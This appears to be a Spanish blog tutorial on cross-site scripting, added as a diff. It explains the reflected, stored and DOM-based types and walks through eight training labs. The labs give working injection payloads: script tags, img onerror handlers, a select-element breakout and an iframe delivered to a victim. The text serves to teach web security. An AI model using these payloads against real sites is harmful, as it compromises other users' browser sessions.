@@ -1,0 +1,824 @@
+<h2 id="0-índice">0. Índice.</h2>
+
+<ul>
+  <li>1 Concepto de Cross-Site Scripting (XSS).
+    <ul>
+      <li>1.1. Definición de la vulnerabilidad.</li>
+      <li>1.2. Detectando vulnerabilidades XSS.</li>
+    </ul>
+  </li>
+  <li>2 Tipos de ataques XSS.
+    <ul>
+      <li>2.1. Reflected XSS.
+        <ul>
+          <li>2.1.1. Presentación.</li>
+          <li>2.1.2. Impacto del reflected XSS.</li>
+          <li>2.1.3. Exploración de Reflected XSS.</li>
+        </ul>
+      </li>
+      <li>2.2. Stored XSS.
+        <ul>
+          <li>2.2.1. Definición.</li>
+          <li>2.2.2. Diferencias entre el Stored y el Reflected XSS.</li>
+          <li>2.2.3. Exploración de Stored XSS vulnerabilities.</li>
+        </ul>
+      </li>
+      <li>2.3. DOM-based XSS.
+        <ul>
+          <li>2.3.1. Antecedentes.</li>
+          <li>2.3.2. Presentación de la vulnerabilidad.</li>
+          <li>2.3.3. Testeo de vulnerabilidades DOM-based.</li>
+          <li>2.3.4. Exploiting de DOM-based XSS con diferentes fuentes y sumideros.</li>
+        </ul>
+      </li>
+      <li>2.4. DOM XSS en combinación con Reflected y Stored XSS.</li>
+    </ul>
+  </li>
+  <li>3 Utilidad de las distintas vulnerabilidades XSS.
+    <ul>
+      <li>3.1. Exploiting cross-site scripting to steal cookies.</li>
+      <li>3.2. Exploiting cross-site scripting to perfom CSRF.</li>
+      <li>3.3. Exploiting cross-site scripting to perfom CSRF.</li>
+    </ul>
+  </li>
+  <li>4 Cómo encontrar y testear vulnerabilidades XSS.
+    <ul>
+      <li>4.1. Cross-site scripting context.</li>
+      <li>4.2. XSS between HTML tags.</li>
+      <li>4.3. XSS in HTML tag attributes.</li>
+      <li>4.4. XSS in JavaScript.</li>
+    </ul>
+
+    <p><br /></p>
+  </li>
+</ul>
+
+<h3 id="1-concepto-de-cross-site-scripting-xss">1. Concepto de Cross-Site Scripting (XSS).</h3>
+
+<h4 id="11-definición-de-la-vulnerabilidad">1.1. Definición de la vulnerabilidad.</h4>
+
+<p>El XSS se trata de un conjunto de vulnerabilidades web que permite a un atacante comprometer las interacciones que el resto de usuarios pueden tener con una aplicación web.</p>
+
+<p>Actúa <strong>manipulando un sitio web para que devuelva código JavaScript malicioso a los usuarios</strong>. Cuando el código malicioso se ejecuta dentro del navegador de una víctima, el atacante puede comprometer la interacción que el usuario tiene con la aplicación.</p>
+
+<p><br /></p>
+
+<h4 id="12-detectando-vulnerabilidades-xss">1.2. Detectando vulnerabilidades XSS.</h4>
+
+<p>Se pueden confirmar la mayoría de las vulnerabilidades XSS inyectando un payload que cause que tu propio navegador ejecute JavaScript. Para dicho propósito se suele utilizar la función <strong>alert()</strong> que saca un mensaje por pantalla en el navegador. Sin embargo, a partir de Junio de 2021, en los navegadores Chrome se utiliza la función <strong>print()</strong> ya que no permiten la ejecución de alert().</p>
+
+<p>La forma de invocar esa alerta dependerá del tipo de XSS con la que estemos tratando.</p>
+
+<p><br /></p>
+
+<h3 id="2-tipos-de-ataques-xss">2. Tipos de ataques XSS.</h3>
+
+<p>Podemos discernir fundamentalmente entre tres clases de XSS. Reflected, Stored y Dom-based XSS.</p>
+
+<p><br /></p>
+
+<h4 id="21-reflected-xss">2.1. Reflected XSS.</h4>
+
+<h5 id="211-presentación">2.1.1. Presentación.</h5>
+<p>Esta es la variedad más simple de implementar un ataque XSS.</p>
+
+<p><strong>Se implementa cuando una aplicación recibe datos en la HTTP request que incluye en la HTTP response sin saneamiento de código</strong></p>
+
+<p>Por ejemplo, supongámos una aplicación web que por alguna razón incluye dentro del html de la respuesta HTTP un mensaje que el usuario incluye en la HTTP request. Supongámos la URL que el usuario manda:</p>
+
+<pre><code class="language-default">https://insecure-website.com/search?term=gift
+</code></pre>
+
+<p>Y en la respuesta HTTP podemos encontrar el valor del parámetro “term” incrustado en el html en forma de cabecera:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;</span>You searched for: gift<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>De esta forma, si el sitio web no implementa saneamiento en contra de XSS, un atacante podría implementar un script malicioso de JavaScript en el parámetro “term”:</p>
+
+<pre><code class="language-default">https://insecure-website.com/search?term=&lt;script&gt; ScriptMalicioso&lt;/script&gt;
+</code></pre>
+
+<p>y si un usuario “pinchase” en la URL que el atacante fabrica (porque por ejemplo se le envía por email, por mensaje de teléfono, etc) se le devolvería una respuesta maliciosa por parte del servidor que contendría en el html la siguiente línea:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;&lt;script&gt;</span><span class="nx">ScriptMalicioso</span><span class="nt">&lt;/script&gt;&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Que desembocaría en la ejecución del script malicioso por parte del navegador de la víctima comprometiendo su integridad.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: Reflected XSS into HTML context with nothing encoded</strong>.</p>
+
+<p>Este laboraotorio contiene una vulnerabilidad XSS y para identificarla vamos a desplegar una alerta mediante alert().</p>
+
+<p>Podemos observar que tenemos una barra que nos permite buscar en el contenido de la aplicación web por términos y se despliega el término de nuestra búsqueda en la página de resultados:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425113113.png" text-align="center" />
+</div>
+
+<p>Así, introducimos en el valor del parámetro “search” de la URL la línea:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">HOLA</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>Obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425113330.png" text-align="center" />
+</div>
+
+<p>Comprobando que efectivamente se trata de un sitio vulnerable a un ataque XSS.</p>
+
+<p><br /></p>
+
+<h5 id="212-impacto-del-reflected-xss">2.1.2. Impacto del reflected XSS.</h5>
+
+<p>Si un atacante puede construir un script que se ejecuta en el navegador de la víctima ha comprometido totalmente a la misma. Entre otras cosas:</p>
+
+<ul>
+  <li>Puede <strong>realizar acciones</strong> por el usuario dentro de la aplicación web.</li>
+  <li>Puede <strong>ver</strong> toda la información que el usuario sea capaz de ver, entre ella, información sensible.</li>
+  <li>Puede <strong>modificar</strong> toda la información que el usuario sea capaz de modificar.</li>
+  <li>Puede <strong>iniciar interacciones maliciosas</strong> con otros usaurios como si fuera el usuario original.</li>
+</ul>
+
+<p><br /></p>
+
+<h5 id="213-exploración-de-reflected-xss">2.1.3. Exploración de Reflected XSS.</h5>
+
+<p>Para llevar a cabo una exploración manual de reflected XSS nos centramos en:</p>
+
+<ul>
+  <li>
+    <p><strong>Testar cualquier punto de entrada de datos, input</strong>.</p>
+  </li>
+  <li>
+    <p><strong>Emitir valores alfanuméricos y comprobar si tales valores aparecen en algún punto de la respuesta HTTP</strong></p>
+  </li>
+  <li>
+    <p><strong>Determinar el contexto del XSS en función de los datos anteriores y coger el payload que más se adapte</strong></p>
+  </li>
+  <li>
+    <p><strong>Testaer payloads alternativos</strong>.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h4 id="22-stored-xss">2.2. Stored XSS.</h4>
+
+<h5 id="221-definición">2.2.1. Definición.</h5>
+
+<p>El Stored XSS también conocido como XSS persistente o XSS de segundo orden es una variante de XSS en el que una aplicación web acepta input de una procedencia no confiable y el payload malicioso que se introduce queda incrustado de forma permanente en una página de la aplicación web. (Ejemplos de esto sería por ejemplo, comentarios, nickname de usuarios, etc) De forma que cualquiera que visitará dicha página estaría recibiendo un html malicioso del servidor provocado por este payload permanente.</p>
+
+<p>Veámos un ejemplo; supongámos un sitio web que permite a un usuario emitir comentarios en un blog, los cuales pueden ser vistos por otros usuarios.</p>
+
+<p>De esta forma el suuario emite un comentario en una request HTTP como la siguiente:</p>
+
+<pre><code class="language-default">POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 100
+
+postId=3&amp;comment=This+post+was+extremely+helpful.&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net
+</code></pre>
+
+<p>Cuando se recibe este post, el servidor añadirá en el html de la página la cabecera:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;</span>This post was extremely helpful.<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Y como tal estará visible para cualquier usuario que entre en dicha página ya que esta ha sido modificada permanentemente.</p>
+
+<p>Así, si asumimos que la página no realiza ningún tipo de control sobre lo que se introduce, un atacante podría introducir un script malicioso de Java Script</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="cm">/* Bad stuff here... */</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>encodeandolo tipo URL en el cuerpo de la request:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
+</code></pre></div></div>
+
+<p>que quedaría permanentemente en el HTML de la página y que, en consecuencia, se ejecutaría en el navegador de cualquiera que visitase la página.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;&lt;script&gt;</span><span class="cm">/* Bad stuff here... */</span><span class="nt">&lt;/script&gt;&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: Stored XSS into HTML context with nothing encoded</strong>.</p>
+
+<p>Este laboraotior nos introduce a una aplicación web que permite a los usuarios dejar comentarios en distintos posts.</p>
+
+<p>Hacemos una prueba para comprobar que nuestro post queda incrustado en la página y comprobar qué partes de los datos que introducimos quedan incrustadas:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425182655.png" text-align="center" />
+</div>
+
+<p>Ahí podemos ver que tanto el nombre como el mensaje quedan incrustados en la página en forma de párrafo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425182723.png" text-align="center" />
+</div>
+
+<p>Así, introducimos un script de JavaScript con la finalidad de desplegar una alerta y completar el laboratorio:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425182837.png" text-align="center" />
+</div>
+
+<p>Posteamos el comentario y al volver a la página del blog obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220425182905.png" text-align="center" />
+</div>
+
+<p>Aunque también podríamos haber utilizado como punto de inyección.</p>
+
+<p><br /></p>
+
+<h4 id="222-diferencias-entre-el-stored-y-el-reflected-xss">2.2.2. Diferencias entre el Stored y el Reflected XSS.</h4>
+
+<p>Aunque ambos tienen el mismo impacto. En términos de explotabilidad, <strong>la diferencia clave entre el stored y el reflected XSS es que el primero es un ataque autocontenido dentro de la propia aplicación</strong>. El atacante no necesita encontrar una forma externa de inducir a otros usuarios a realizar una solicitud particular que contenga su exploit. Más bien, el atacante coloca su exploit en la propia aplicación y simplemente espera a que los usuarios lo encuentren, es en ese sentido mucho más dañino.</p>
+
+<p><br /></p>
+
+<h4 id="223-exploración-de-stored-xss-vulnerabilities">2.2.3. Exploración de Stored XSS vulnerabilities.</h4>
+
+<p>Al margen del hecho de que muchas vulnerabilidades XSS Stored pueden ser encontradas utilizando el scanner de burpsuite.</p>
+
+<p>Si se quiere llevar a cabo una búsqueda manual se necesitan buscar todos los posibles puntos de entradas de datos entre los que se incluyen:</p>
+
+<ul>
+  <li>Parámetros dentro de la URL.</li>
+  <li>La propia ruta incluida en la URL.</li>
+  <li>Cabeceras de la HTTP request.</li>
+</ul>
+
+<p>Y aquellos puntos en los que se puede exponer la información introducida, entre los que podemos encontrar:</p>
+
+<ul>
+  <li>Nombres de usuario</li>
+  <li>Comentarios</li>
+  <li>Resultados de búsqueda</li>
+</ul>
+
+<p>Aunque los puntos de salida y los puntos de entrada dependen en gran medida de las funcionalidades de la aplicaicón que pueden ser muy extensas y variadas.</p>
+
+<p><strong>Lo más seguro es intentar identificar todos los puntos de input data de la aplicación e introducir un valor para ver si dicho valor se encuentra en la respuesta HTTP. Si eso sucede, sólo quedaría comprobar si el punto de entrada es efectivamente un punto de inyección verificando si es vulnerable a XSS</strong>.</p>
+
+<p>Observemos que esta es a su vez la misma metodología que seguíamos con el reflected XSS.</p>
+
+<p><br /></p>
+
+<h4 id="23-dom-based-xss">2.3. DOM-based XSS.</h4>
+
+<h5 id="231-antecedentes">2.3.1. Antecedentes.</h5>
+
+<p>DOM es un acrónimo que responde a Document Object Model es una interfaz de plataforma diseñado para la representación documentos de lenguaje de marcas (HTML, XHTML y XML).</p>
+
+<p>El DOM permite el acceso dinámico a través de la programación para acceder, añadir y cambiar dinámicamente contenido estructurado en documentos con lenguajes como JavaScript.</p>
+
+<p>Es decir, que existen páginas que poseen funcionalidades que cambian el contenido de la misma de forma autónoma (sin necesidad de que el servidor envíe una respuesta HTTP) recurriendo al código JavaScript implementado en el DOM de la misma.</p>
+
+<p><br /></p>
+
+<h5 id="232-presentación-de-la-vulnerabilidad">2.3.2. Presentación de la vulnerabilidad.</h5>
+
+<p>De esta forma, en términos sencillos, una DOM-based XSS vulnerability se aprovecha de la falta de validación de la aplicación web un payload malicioso en una fuente HTML (una parte de la página en la que el usuario puede introducir input, como un parámetro de la URL) que termina en un sumidero JavaScript (un fragmento de código que ejecuta una acción, como innerHTML que introduce un parámetro dentro del HTML) del DOM de la misma para provocar un comportamiento nocivo del navegador de la víctima.</p>
+
+<p>El rasgo más característico consiste en que, a diferencia de lo que ocurría con el reflected o el stored XSS, el Dom-based se apoya en el DOM para ejecutar JavaScript malicioso y no necesita del servidor para que se lleve a cabo la incorporación del código JavaScript en la respuesta. Aun así, es necesario recalcar que, aunque se tratan de entidades distintas,</p>
+
+<p>En el siguiente ejemplo, una aplicación usa JavaScript para leer el valor de un campo de entrada y escribir ese valor en un elemento dentro del HTML:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">search</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">search</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">results</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">results</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">results</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">You searched for: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">search</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>En el código anterior se puede observar como se selecciona un elemento cuyo ID es “search” y se obtiene su valor almacenándose en la variable JavaScript ‘search’. Seguidamente, se obtiene un elemento HTML con ID “results” y se redefine empleando innerHTML incrustando el contenido de search de vuelta en la página.</p>
+
+<p>Así, un atacante podría introducir en el parámetro ‘search’ que se introduce dentro del documento HTML código malicioso:</p>
+
+<pre><code class="language-HTML">You searched for: &lt;img src=1 onerror='/* Bad stuff here... */'&gt;
+</code></pre>
+
+<p>Y al ser devuelto en la página, si no se valida adecuadamente, puede ocurrir que se procese el código.</p>
+
+<p>En un caso típico, <strong>el campo de entrada se completaría como parte de la solicitud HTTP, como un parámetro de cadena de consulta de URL, lo que permitiría al atacante realizar un ataque utilizando una URL maliciosa, de la misma manera que en un reflected XSS</strong>.</p>
+
+<p><br /></p>
+
+<h6 id="233-testeo-de-vulnerabilidades-dom-based">2.3.3. Testeo de vulnerabilidades DOM-based.</h6>
+
+<p>Muchas de las vulnerabilidades DOM-based XSS se pueden encontrar de forma rápida y confiable empleando el Burp’s web vulnerability scanner.</p>
+
+<p><br /></p>
+
+<p><strong>Testeando HTML sources</strong></p>
+
+<p>Un <strong>HTML sink</strong> o sumidero HTML es un punto de entrada de datos HTML por parte del usuario que puede ser empleado en un código JavaScript como location.search.</p>
+
+<p>En primer lugar, para testear una posible vulnerabilidad DOM-based XSS, introducimos un término cualquiera e intentamos observar dónde aparece de vuelta en el documento el término que acabamos de introducir. (Podemos utilizar la opción “inspeccionar elemento” y utilizar Ctrl+F para buscar el término en el documento en bruto).</p>
+
+<p>Una vez encontrado, es útil hacer un esfuerzo para intentar comprender cómo se procesa este input introduciendo el mismo input de distintas formas (cambiándo mayúsculas/minúsculas, comillas, redirectores, etc)</p>
+
+<p>Hay que tener en cuenta que los navegadores se comportan de manera diferente con respecto a la codificación de URL, Chrome, Firefox y Safari codificarán en URL <strong>location.search</strong> y <strong>location.hash</strong>, mientras que IE11 y Microsoft Edge (pre-Chromium) no codificarán en URL estas fuentes. <strong>Si sus datos se codifican en URL antes de ser procesados, es poco probable que funcione un ataque XSS</strong>.</p>
+
+<p><br /></p>
+
+<p><strong>Testing JavaScript execution sinks</strong></p>
+
+<p>Un <strong>JavaScript execution sink</strong> es una función JavaScript que procesa una instrucción que ejecuta el navegador. Estas funciones es donde desemboca generalmente el input proporcionado en una HTML source.</p>
+
+<p>Testear estas funciones puede ser un poco más difícil ya que el input puede no volver a aparecer en el documento HTML. En su lugar, se hace uso de un debbuger de JavaScript.</p>
+
+<p>Una buena herramienta es DOM-based XSS.</p>
+
+<p><br /></p>
+
+<h6 id="234-exploiting-de-dom-based-xss-con-diferentes-fuentes-y-sumideros">2.3.4. Exploiting de DOM-based XSS con diferentes fuentes y sumideros.</h6>
+
+<p>Técnicamente, un sitio web es vulnerable al DOM-based XSS cuando existe una ruta ejecutable por la cual los datos proporcionados pueden viajar desde una fuente a un sumidero.</p>
+
+<p>En la práctica, los diferentes fuentes y sumideros existentes tienen diferentes propiedades y comportamientos que pueden afectar a la explotabilidad.</p>
+
+<p>Además, los scripts del sitio web pueden realizar un procesamiento de datos al que debemos acomodarnos a la hora de aprovechar una vulnerabilidad. Hay una variedad de sumideros que son relevantes para las vulnerabilidades basadas en DOM. Se expondrá una lista más adelante.</p>
+
+<p>El sumidero document.write funciona con elementos de secuencia de comandos, por lo que puede usar una carga útil simple, como la siguiente:</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 3: DOM XSS in “document.write” sink using source “location.search”</strong></p>
+
+<p>Antes de comenzar con el laboratorio, debemos tratar la funcionalidad de los dos sinks que tratamos aquí, <em>document.write</em> y <em>location.search</em>.</p>
+
+<ul>
+  <li>
+    <p><strong>document.write</strong>: Este es un método del lenguaje del DOM HTML que escribe directamente sobre el documento HTML admitiendo etiquetas HTML.</p>
+  </li>
+  <li>
+    <p><strong>location.search</strong>: Es un objeto javascript que devuelve la “querystring” de la URL del usuario.</p>
+  </li>
+</ul>
+
+<p>Observemos por tanto que ambos objetos pueden ser empleados en una ruta ejecutable que coloque el input del usuario a través de los parámetros de búsqueda dentro del documento HTML del navegador.</p>
+
+<p>Este laboratorio simula una aplicación web vulnerable a DOM-based XSS debudi a que utiliza la función JavaScript <em>document.write</em> para escribir datos dentro de la página llamándola con contenido obtenido desde <em>location.search</em>, contenido que puede ser controlado por el usuario desde la URL.</p>
+
+<p>De esta forma, accedemos al laboratorio y observamos que tiene una funcionalidad de búsqueda. Procedemos a llevar a cabo un proceso de exploración del procesamiento de nuestro input en la web. Observamos que nuestro input se coloca en dos sitios.</p>
+
+<p>Por un lado, se coloca en forma de texto en el documento HTML y por otro en un elemento img src:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220517131250.png" text-align="center" />
+</div>
+
+<p>El primero está protegido frente a un ataque XSS, pero el segundo es vulnerable cerrando correctamente el elemento HTML en primer lugar y luego construyéndo un elemento script:</p>
+
+<pre><code class="language-HTML">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<p>Así, el razonmiento consiste en que el document.write construyen un objeto HTML “img src” en el que coloca nuestro output sin validar los datos que introducimos volviendo la aplicación vulnerable a un ataque XSS sobre el DOM.</p>
+
+<p><br /></p>
+
+<p>También puede ocurrir que se obtengan valores de la URL a partir de un script de JavaScript visible en el documento HTML.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 4: DOM XSS in document.write sink source location.search inside select element</strong></p>
+
+<p>Este laboratorio contiene una DOM XSS vulnerability en la funcionalidad “stock check” de un producto. La página construye un elemento HTML <em>select</em> utilizando <em>location.search</em> en la función <em>document.write</em>:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kd">var</span> <span class="nx">stores</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">London</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Paris</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Milan</span><span class="dl">"</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">store</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">)).</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">storeId</span><span class="dl">'</span><span class="p">);</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;select name="storeId"&gt;</span><span class="dl">'</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="nx">store</span><span class="p">)</span> <span class="p">{</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;option selected&gt;</span><span class="dl">'</span><span class="o">+</span><span class="nx">store</span><span class="o">+</span><span class="dl">'</span><span class="s1">&lt;/option&gt;</span><span class="dl">'</span><span class="p">);}</span>
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">stores</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">stores</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">===</span> <span class="nx">store</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;option&gt;</span><span class="dl">'</span><span class="o">+</span><span class="nx">stores</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">&lt;/option&gt;</span><span class="dl">'</span><span class="p">);</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;/select&gt;</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Observemos que mediante un .get se obtiene el parámetro storeId de la URL y que el valor de este mismo parámetro se instaura dentro de un select element dentro de document.write, además hay que advertir que necesitamos respetar la sintaxis. Así, añadimos en la URL de la página el parámetro:</p>
+
+<pre><code class="language-default">/products?productId=1&amp;storeId="&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(1)&gt;
+</code></pre>
+
+<p>Cerramos el elemento select y añadimos un elemento img src falso que desencadena el handler onerror que despliega una alerta. Aunque también podríamos haber introducido un script que despliege la misma alerta.</p>
+
+<p><br /></p>
+
+<p>Por otra parte tenemos el sumidero <em>innerHTML</em>.</p>
+
+<ul>
+  <li><strong>innerHTML</strong>: La propiedad <em>innerHTML</em> es parte del DOM y permite que el código Javascript manipule elementos HTML en tiempo real. Específicamente, permite leer y reemplazar todo dentro de un elemento DOM dado (etiqueta HTML).</li>
+</ul>
+
+<p><strong>Este no acepta el elemento &lt;script&gt; y por tanto, para desplegar una alerta hará falta emplear errorhandlers de img o iframe</strong></p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 5: DOM XSS in innerHTML sink using source location.search</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad DOM XSS en la funcionalidad “search” del blog. Emplea un <em>innerHTML</em> para cambiar el contenido del HTML utilizando los datos proporcionados por <em>location.search</em></p>
+
+<p>Así, accdemos al laboratorio e introducimos el término TEST en la barra buscadora. De esta forma encontramos que el término TEST aparece en la respuesta HTTP.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220517164403.png" text-align="center" />
+</div>
+
+<p>Examinando más afondo el documento HTML encontramos que este es el valor que se encuentra dentro de una etiqueta &lt;span&gt; y que tiene un atributo mencionado como id = searchMessage.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220517164420.png" text-align="center" />
+</div>
+
+<p>Es decir, que el contenido se obtiene del valor de la variable que tiene por nombre searchMessage y a su vez, buscando el término searchMessage llegamos a un script de javascript que procesa el contenido de dicha variable con InnerHTML, que este localiza el contenido de la variable “query” qie a su vez deriva en el parámetro search de la URL.</p>
+
+<p>Es decir, que el valor del parámetro “search” que es lo que nosotros buscámos se coloca de vuelta dentro del documento HTML por medio del método innerHTML. Con lo que no podemos emplear una etiqueta script, lo hacemos con un errorhandler de img src.</p>
+
+<p><br /></p>
+
+<ul>
+  <li>Otra serie de sumideros que pueden alterar el HTML de una página y estar presentes son aquellos que se utilizan en librerias como jQuery. Un ejemplo es <em>attr()</em>, que cambia el valor de un atributo de un elemento dado.</li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: DOM XSS in jQuery anchor href attribute sink using location.search source</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad DOM-based XSS en la funcionalidad de emisión de feedback. Emplear un selector; $ de la librería jQuery para encontrar un elemento <em>anchor</em> y cambiar su elemento <em>href</em> mediante el location.search.</p>
+
+<p>En primer lugar, accedemos al laboratorio y vamos a la pestaña que nos permite emitir feedback y comprobamos la existencia de un parámetro en la URL; <em>retunPath</em>. Al testearlo, comprobamos que el valor del parámetro se introduce de nuevo en del documento HTML en forma de una referencia sobre un botón Back:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220518103134.png" text-align="center" />
+</div>
+
+<p>Además, tenemos acceso al script que lo configura. En él podemos observar que toma el valor de “backlink” y modifica el valor del atributo “href” cofiendo los datos de location.search, en concreto, nuestro parámetro retunPath.</p>
+
+<p>Así, podemos modificar el valor de href para que tenga un comportamiento malicioso;</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220518103454.png" text-align="center" />
+</div>
+
+<p>Y al pulsar el botón Back se ejecutará el código JavaScript que sigue a los dos puntos.</p>
+
+<p><br /></p>
+
+<ul>
+  <li>Otro sumidero potencial dentro de la librería jQuery’s es la <em>función selector $()</em> el cual puede ser utilizado para inyectar objetos maliciosos dentro del DOM.</li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 7: DOM XSS in jQuery selector sink using a hashchange event</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad DOM-based XSS en la página home. Emplea un selector $() de jQuery para llevar al usuario con un auto-scroll al post seleccionado cuyo título se pasa mediante <em>location.hash</em>. Es decir, la página te traslada con el scroll automáticamente al lugar en el que se encuentre un término (si existe) indicado después de un “hashtag” en la URL. /#termino.</p>
+
+<p>Así, por ejemplo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220610165058.png" text-align="center" />
+</div>
+
+<p>Como el término To se introduce en un código JavaScript sin validar, podemos realizar una inyección de código. Asi, si en la URL ponemos: /#&lt;img src=1 onerror=print()&gt; y observamos que se abrira la pestaña de la impresora en nuestro navegador probando que la inyección de código ha sido satisfactoria.</p>
+
+<p>Así, vamos al servidor del exploit y utilizamos un iframe para cargar el contenido de la URL con el payload malicioso:</p>
+
+<pre><code class="language-HTML">&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;
+</code></pre>
+
+<p>y le damos a “deliver to victim” para completar el laboratorio:</p>
+
+<p><br /></p>
+
+<ul>
+  <li>DOM XSS in AngularJS. Si se utiliza un marco de trabajo como AngularJS es posible ejecutar JavaScript malicioso sin paréntesis angulares ni eventos. Cuando un sitio usa el atributo <em>ng-app</em> en un elemento HTML, AngularJS lo procesará. En este caso, AngularJS ejecutará JavaScript dentro de llaves dobles que pueden ocurrir directamente en HTML o dentro de atributos.</li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 8: DOM XSS in AngularJS expression with angle brackets and double quots HTML-encoded</strong></p>
+
+<p>Este laboratorio contienw una DOM-based XSS vulnerabilitie en un expresión de AngularJS dentro de la funcionalidad.</p>
+
+<p>Al introducirnos dentro del laboratorio e introducir un string alfanumérico observamos que la etiqueta &lt;body&gt; contiene un atributo denominado ng-app que es un punto de entrada de Angular.</p>
+
+<p>Así, introducimos  y observamos que las llaves no salen. De esta forma, metemos  y resolvemos el laboratorio.</p>
+
+<p><br /></p>
+
+<h4 id="24-dom-xss-en-combinación-con-reflected-y-stored-xss">2.4. DOM XSS en combinación con Reflected y Stored XSS.</h4>
+
